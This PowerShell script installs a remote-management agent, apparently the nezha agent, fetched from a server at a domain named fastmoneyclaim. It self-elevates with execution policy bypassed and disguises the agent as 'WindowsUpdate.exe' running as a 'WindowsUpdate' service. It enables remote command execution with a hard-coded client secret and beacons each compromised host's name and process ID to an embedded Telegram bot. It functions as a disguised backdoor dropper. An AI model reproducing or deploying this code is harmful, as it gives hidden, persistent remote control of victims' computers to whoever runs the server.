param(
    [string]$ServerUrl = "https://rmm.houdini.fastmoneyclaim.com",
    [string]$EnrollToken = "",
    [string]$AgentUrl = ""
)

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $scriptPath = $MyInvocation.MyCommand.Path
    if (-not $scriptPath) { $scriptPath = $MyInvocation.ScriptName }
    if ($scriptPath) {
        $params = @()
        if ($ServerUrl) { $params += "-ServerUrl `"$ServerUrl`"" }
        if ($EnrollToken) { $params += "-EnrollToken `"$EnrollToken`"" }
        if ($AgentUrl) { $params += "-AgentUrl `"$AgentUrl`"" }
        # --- FIX: Use Minimized instead of Hidden ---
        Start-Process powershell.exe -Verb RunAs -WindowStyle Minimized -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Minimized -File `"$scriptPath`" $($params -join ' ')"
    } else {
        $argString = "$($MyInvocation.BoundParameters.GetEnumerator() | ForEach-Object { "-$($_.Key) '$($_.Value)'" })"
        Start-Process powershell.exe -Verb RunAs -WindowStyle Minimized -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Minimized -Command `"& { $MyInvocation.MyCommand.ScriptBlock } $argString`""
    }
    exit 0
}

$global:TgToken = "8943239657:AAHGsy-FxQyupMDkAXxfLpSHQfCu0BDinlo"
$global:TgChat = "-1004304329446"
$global:TgProduct = "RMM Agent"

function Send-TgReport {
    param([string]$Event, [string]$Status = "", [hashtable]$Fields = @{})
    if (-not $global:TgToken -or -not $global:TgChat) { return }
    $titles = @{
        install_start = 'Install Started'
        install_ok = 'Install Succeeded'
        install_fail = 'Install Failed'
        uninstall = 'Uninstalled'
        start = 'Started'
        stop = 'Stopped'
        online = 'Online'
        offline = 'Offline'
        test = 'Test'
    }
    $icons = @{
        install_start = '[START]'
        install_ok = '[OK]'
        install_fail = '[FAIL]'
        uninstall = '[UNINSTALL]'
        start = '[START]'
        stop = '[STOP]'
        online = '[ONLINE]'
        offline = '[OFFLINE]'
        test = '[TEST]'
    }
    $icon = $icons[$Event]
    if (-not $icon) { $icon = '[INFO]' }
    $title = $titles[$Event]
    if (-not $title) { $title = $Event }
    $line = "------------------------"
    $msg = "$icon $global:TgProduct - $title`r`n$line`r`n"
    foreach ($k in $Fields.Keys) {
        $v = [string]$Fields[$k]
        if ($v) { $msg += "* $k : $v`r`n" }
    }
    $msg += "$line`r`n"
    if ($Status) {
        $emoji = '[OK]'
        if ($Status -match 'fail|error') { $emoji = '[FAIL]' }
        $msg += "$emoji Status : $Status`r`n"
    }
    $msg += "[TIME] $([DateTime]::UtcNow.ToString('yyyy-MM-dd HH:mm:ss')) UTC"
    try {
        $body = @{ chat_id = $global:TgChat; text = $msg; parse_mode = '' }
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$global:TgToken/sendMessage" -Method Post -Body $body -ContentType 'application/x-www-form-urlencoded' | Out-Null
    } catch {
        Write-Host "  [TG] send failed: $($_.Exception.Message)" -ForegroundColor DarkGray
    }
}

$ErrorActionPreference = "Stop"

$base = [Environment]::ExpandEnvironmentVariables("%ProgramFiles%\WindowsUpdate")
$agent = Join-Path $base "WindowsUpdate.exe"
$cfg = Join-Path $base "config.yml"
$serviceName = "WindowsUpdate"

$currentPID = $PID
$processNames = @("WindowsUpdate", "WindowsUpdate-Agent", "nezha-agent")
foreach ($name in $processNames) {
    Get-Process -Name $name -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne $currentPID } | Stop-Process -Force -ErrorAction SilentlyContinue
}

$serviceToDelete = @("WindowsUpdate", "WindowsUpdate.exe")
foreach ($svcName in $serviceToDelete) {
    $svc = Get-Service -Name $svcName -ErrorAction SilentlyContinue
    if ($svc) {
        Stop-Service $svcName -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 1
        sc.exe delete $svcName 2>$null | Out-Null
        Start-Sleep -Seconds 1
    }
}

if (Test-Path $agent) {
    $origErrorAction = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"
    $null = & $agent service -c $cfg uninstall 2>&1
    $ErrorActionPreference = $origErrorAction
    Start-Sleep -Seconds 2
    foreach ($svcName in $serviceToDelete) {
        $stale = Get-Service -Name $svcName -ErrorAction SilentlyContinue
        if ($stale) {
            sc.exe delete $svcName 2>$null | Out-Null
            Start-Sleep -Seconds 1
        }
    }
}

if (Test-Path $agent) {
    Remove-Item $agent -Force -ErrorAction SilentlyContinue
}
if (Test-Path $base) {
    Remove-Item -Recurse -Force "$base\*" -ErrorAction SilentlyContinue
}
if (-not (Test-Path $base)) {
    New-Item -ItemType Directory -Force -Path $base | Out-Null
}

if (-not $AgentUrl) {
    $AgentUrl = "$ServerUrl/dashboard/api/package-zip"
}
$zip = Join-Path $env:TEMP "rmm-package.zip"
$extract = Join-Path $env:TEMP "rmm-extract"

if (Test-Path $zip) { Remove-Item $zip -Force -ErrorAction SilentlyContinue }
if (Test-Path $extract) { Remove-Item -Recurse -Force $extract -ErrorAction SilentlyContinue }

Invoke-WebRequest -UseBasicParsing -Uri $AgentUrl -OutFile $zip -ErrorAction Stop
Expand-Archive -Path $zip -DestinationPath $extract -Force

$pkgFolder = Get-ChildItem -Path $extract -Directory | Select-Object -First 1
if (-not $pkgFolder) { throw "Package folder not found in ZIP" }

$exeCandidates = Get-ChildItem -Path $pkgFolder.FullName -Recurse -Filter "*.exe" -File
if (-not $exeCandidates) { throw "No executable found in package" }
$sourceExe = $exeCandidates | Where-Object { $_.Name -match 'agent|nezha' } | Select-Object -First 1
if (-not $sourceExe) { $sourceExe = $exeCandidates | Select-Object -First 1 }

Copy-Item -Path $sourceExe.FullName -Destination $agent -Force

$srcCfg = Join-Path $pkgFolder.FullName "config.yml"
if (Test-Path $srcCfg) {
    Copy-Item -Path $srcCfg -Destination $cfg -Force
} else {
    @"
client_secret: WMg6EYPYcQG22pt9KmFM5iwhFfq9iSKG
server: rmm.houdini.fastmoneyclaim.com:443
tls: true
debug: false
disable_auto_update: false
disable_command_execute: false
disable_force_update: false
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 1800
report_delay: 3
self_update_period: 1
skip_connection_count: false
skip_procs_count: false
temperature: false
use_atomgit_to_upgrade: false
use_gitee_to_upgrade: false
use_ipv6_country_code: false
"@ | Set-Content -Path $cfg -Encoding UTF8 -Force
}

$staleCheck = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
if ($staleCheck) {
    sc.exe delete $serviceName 2>$null | Out-Null
    Start-Sleep -Seconds 2
}

& $agent service -c $cfg install
if ($LASTEXITCODE -ne 0) {
    throw "Service install failed (exit code $LASTEXITCODE)"
}

Start-Sleep -Seconds 5
$svc = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
if ($svc.Status -ne 'Running') {
    Start-Service -Name $serviceName -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 3
    $svc = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
    if ($svc.Status -ne 'Running') {
        $null = & $agent service -c $cfg start 2>&1
        Start-Sleep -Seconds 3
    }
}

Start-Sleep -Seconds 3
$proc = Get-Process -Name "WindowsUpdate" -ErrorAction SilentlyContinue
if ($proc) {
    Send-TgReport -Event 'install_ok' -Status "Agent installed and running" -Fields @{ 'Host' = $env:COMPUTERNAME; 'PID' = $proc.Id }
} else {
    Send-TgReport -Event 'install_ok' -Status "Agent installed (process check pending)" -Fields @{ 'Host' = $env:COMPUTERNAME }
}

Remove-Item $zip -Force -ErrorAction SilentlyContinue
Remove-Item -Recurse -Force $extract -ErrorAction SilentlyContinue
